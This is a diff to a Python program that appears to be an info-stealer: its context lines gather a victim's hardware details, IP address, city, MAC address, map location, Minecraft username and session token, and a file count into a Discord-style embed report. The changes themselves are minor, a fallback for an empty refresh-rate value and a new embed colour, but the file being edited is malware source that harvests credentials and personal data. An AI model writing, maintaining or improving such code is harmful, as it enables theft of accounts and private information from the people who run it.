@@ -264,6 +264,8 @@ def main():
     except: size = 'N/A'
     try: rr = subprocess.check_output('wmic path win32_VideoController get currentrefreshrate').decode().split('\n')[1].strip()
     except: rr = 'N/A'
+    if rr == "":
+        rr = 'N/A'
     try: bm = subprocess.check_output('wmic bios get manufacturer').decode().split('\n')[1].strip()
     except: bm = 'N/A'
     try: mn = subprocess.check_output('wmic csproduct get name').decode().split('\n')[1].strip()
@@ -685,7 +687,7 @@ Email: {email if email else ""}\n"""
                              "icon_url": "https://i.imgur.com/bbWgtHI.png"
                          },
                          "description": f"""{embedMsg}\n**__PC INFO__ <:pc:1035526269925867640>**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__ <:loc:1035525770258415657>**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Country Emoji:** {globalinfo}\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n__**Minecraft Info <:fr:1035524460939329617>**__ \n**Minecraft Profile:** `{McUsername}`\n**Token:** `{McToken}`\n **Account type:** `{sessionType}`\n **Name:** `{McUser}`\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
-                         "color": 0x1e8a81,
+                         "color": 0xff0000,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "thumbnail": {
                            "url": "https://i.imgur.com/dEiUxyB.png"
